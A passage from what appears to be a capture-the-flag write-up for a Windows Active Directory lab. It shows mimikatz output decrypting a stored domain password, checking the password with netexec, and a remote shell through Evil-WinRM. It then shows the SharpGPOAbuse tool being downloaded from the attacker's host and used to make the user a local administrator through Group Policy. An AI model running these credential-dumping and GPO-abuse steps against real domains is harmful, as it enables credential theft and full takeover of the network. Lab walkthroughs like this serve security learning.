  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0

mimikatz(commandline) # exit
Bye!

```

### WinRM

#### Validate

The creds are good for SMB and WinRM:

```

oxdf@hacky$ netexec smb office.htb -u hhogan -p 'H4ppyFtW183#'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\hhogan:H4ppyFtW183# 
oxdf@hacky$ netexec winrm office.htb -u hhogan -p 'H4ppyFtW183#'
WINRM       10.10.11.3      5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [+] office.htb\hhogan:H4ppyFtW183# (Pwn3d!)

```

#### Shell

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell:

```

oxdf@hacky$ evil-winrm -i office.htb -u hhogan -p 'H4ppyFtW183#'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents> 

```

## Administrator Access

### Enumeration

I already noted above that HHogan is a member of the “GPO Managers” group:

```
*Evil-WinRM* PS C:\Users\HHogan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

There are a handful of GPOs here:

```
*Evil-WinRM* PS C:\programdata> Get-GPO -All | Select-Object DisplayName

DisplayName
-----------
Windows Firewall GPO
Default Domain Policy
Default Active Directory Settings GPO
Default Domain Controllers Policy
Windows Update GPO
Windows Update Domain Policy
Software Installation GPO
Password Policy GPO

```

### GPO Abuse

I’m going to assume that means that HHogan can edit GPOs. GPOs, or Group Policy Objects, are policies that Windows uses to manage computers at scale. It can control basically anything about a Windows computer.

There’s a really nice tool from FSecureLabs called [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) designed to abuse GPOs. It offers the following:

![image-20240614171518261](/img/image-20240614171518261.png)

I’ll host a copy on my Python webserver and upload it:

```
*Evil-WinRM* PS C:\programdata> wget 10.10.14.5/SharpGPOAbuse.exe -outfile SharpGPOAbuse.exe

```

The first GPO isn’t writable:

```
*Evil-WinRM* PS C:\programdata> .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName "Windows Firewall GPO"
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Windows Firewall GPO" is: {04FE5C75-0078-4D44-97C5-8A796BE906EC}
Access to the path '\\office.htb\SysVol\office.htb\Policies\{04FE5C75-0078-4D44-97C5-8A796BE906EC}\Machine\Microsoft\Windows NT\SecEdit\' is denied.[!] Exiting...

```

But the second one I try works:

```
*Evil-WinRM* PS C:\programdata> .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName "Default Domain Policy"
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!

```

This doesn’t take effect until the GPO refreshes. HHogan has permissions to run `gpupdate /force` which will make that happen now:

```
*Evil-WinRM* PS C:\programdata> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.

```

Now HHogan is in the administrator’s group:

```
*Evil-WinRM* PS C:\programdata> net user hhogan
User name                    HHogan
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 5:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.

```

It won’t show in my current session, but on exiting and reconnecting:

```

oxdf@hacky$ evil-winrm -i office.htb -u hhogan -p 'H4ppyFtW183#'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\GPO Managers                        Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

And I can read `root.txt`:

```
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
f763e698************************

```